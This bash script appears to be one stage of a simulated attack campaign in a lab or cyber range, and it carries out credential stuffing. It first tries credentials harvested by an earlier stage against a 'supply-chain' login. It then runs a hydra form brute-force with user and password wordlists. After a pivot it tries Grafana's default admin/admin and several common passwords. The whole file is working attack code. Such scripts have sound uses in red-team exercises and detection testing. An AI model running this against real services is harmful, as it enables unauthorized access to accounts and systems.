#!/bin/bash
set -uo pipefail
source "$(dirname "$0")/common.sh"

# Stage 5: credential stuffing. Tries the actually-leaked creds first
# (supply-chain's HTML-comment default account, if harvest_credentials.sh
# found it), then falls back to a generic wordlist -- same shape as a
# real credential-stuffing run against a vendor portal and, once pivoted,
# against mgmt-tier Grafana's default admin/admin.
[ -f "$CREDS_FILE" ] && source "$CREDS_FILE"

log "CREDSTUFF" "Starting hydra form brute-force against supply-chain/login"
if [ -n "${SUPPLY_CHAIN_USER:-}" ]; then
  log "CREDSTUFF" "Trying harvested default account ${SUPPLY_CHAIN_USER} first"
  curl -s -o /dev/null -w 'POST /login (harvested creds) -> %{http_code}\n' \
    -X POST "${TARGET_HTTP}/login" \
    --data "username=${SUPPLY_CHAIN_USER}&password=${SUPPLY_CHAIN_PASS}" \
    | tee -a "$LOG_DIR/attacker-campaign.log"
fi
hydra -L /scripts/wordlists/users.txt -P /scripts/wordlists/passwords.txt \
  -o "$LOG_DIR/hydra-http-$(date +%s).txt" \
  "$TARGET_HOST" http-post-form "/login:username=^USER^&password=^PASS^:F=404" \
  2>&1 | tee -a "$LOG_DIR/attacker-campaign.log"
log "CREDSTUFF" "supply-chain credential stuffing complete"

if have_pivot; then
  log "CREDSTUFF" "Trying default admin/admin against mgmt-tier Grafana (${GRAFANA_IP})"
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
    -X POST "http://${GRAFANA_IP}:3000/login" \
    -H 'Content-Type: application/json' \
    -d '{"user":"admin","password":"admin"}')
  log "CREDSTUFF" "Grafana login admin/admin -> ${code}"
  for pass in password admin123 summer2024 123456; do
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
      -X POST "http://${GRAFANA_IP}:3000/login" \
      -H 'Content-Type: application/json' \
      -d "{\"user\":\"admin\",\"password\":\"${pass}\"}")
    log "CREDSTUFF" "Grafana login admin/${pass} -> ${code}"
    sleep 1
  done
else
  log "CREDSTUFF" "No mgmt-tier route yet -- skipping Grafana"
fi
